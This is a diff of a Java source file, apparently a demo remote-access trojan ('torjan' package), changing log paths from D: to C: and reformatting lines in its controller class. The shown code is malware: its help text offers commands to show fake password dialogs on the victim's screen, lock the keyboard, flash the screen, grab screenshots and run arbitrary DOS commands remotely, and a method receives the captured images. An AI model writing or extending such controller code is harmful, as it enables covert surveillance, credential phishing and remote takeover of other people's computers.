@@ -1,5 +1,4 @@
 ﻿package com.dlm.demo.torjan;
-
 import java.io.BufferedWriter;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
@@ -38,7 +37,7 @@ public class ControlWin {
 	int picNum = 1;
 	int PORT = 1220;
 	String IP = "127.0.0.1";
-	String path = "D:\\pic";
+	String path = "C:\\pic";
 	File file;
 	BufferedWriter bw;
 	String fileName;
@@ -52,16 +51,17 @@ public class ControlWin {
 			Date date = new Date();
 			SimpleDateFormat sdf = new SimpleDateFormat("MM月dd日HH时mm分");
 			fileName = sdf.format(date);
-			file = new File("D:\\pic\\" + fileName);
+			file = new File("C:\\pic\\" + fileName);
 			file.mkdirs();
-			file = new File("D:\\pic\\" + fileName + "\\log.txt");
+			file = new File("C:\\pic\\" + fileName + "\\log.txt");
 			try {
-				bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file)));
+				bw = new BufferedWriter(new OutputStreamWriter(
+						new FileOutputStream(file)));
 			} catch (FileNotFoundException e) {
 				e.printStackTrace();
 			}
 			try {
-				// 所有的记录都会存在D:\\pic这个目录下~
+				// 所有的记录都会存在C:\\pic这个目录下~
 				bw.write("开始记录");
 				bw.newLine();
 				bw.flush();
@@ -93,8 +93,14 @@ public class ControlWin {
 			} else if (dosS.equals("")) {
 				continue;
 			} else if (dosS.endsWith("-help")) {
-				System.out.println("-doutmsg msg 以对话框形式输出信息\n" + "-dinmsg msg弹出一个输入对话框+显示信息msg\n" + "-dinpass msg 弹出一个输入密码对话框+显示信息msg\n" + "-flash msg 闪屏并显示msg所表示的文字\n"
-						+ "-p:获取图片\n" + "-m l锁定键盘 .....-m a取消锁定\n" + "输入其则执行相应的dos命令，如输入ipconfig 则显示相应的ip信息\n" + "exit:退出");
+				System.out
+						.println("-doutmsg msg 以对话框形式输出信息\n"
+								+ "-dinmsg msg弹出一个输入对话框+显示信息msg\n"
+								+ "-dinpass msg 弹出一个输入密码对话框+显示信息msg\n"
+								+ "-flash msg 闪屏并显示msg所表示的文字\n" + "-p:获取图片\n"
+								+ "-m l锁定键盘 .....-m a取消锁定\n"
+								+ "输入其则执行相应的dos命令，如输入ipconfig 则显示相应的ip信息\n"
+								+ "exit:退出");
 				continue;
 			}
 			try {
@@ -124,11 +130,11 @@ public class ControlWin {
 		}
 
 	}
-
 	/*接受被控制端发送过来的图片*/
 	public void getPic() {
 		int length = 0;
-		File file = new File(path + "\\" + fileName + "\\" + (picNum++) + ".jpg");
+		File file = new File(path + "\\" + fileName + "\\" + (picNum++)
+				+ ".jpg");
 		byte[] imageData = new byte[8192];
 		FileOutputStream fos = null;
 		int num = 0;
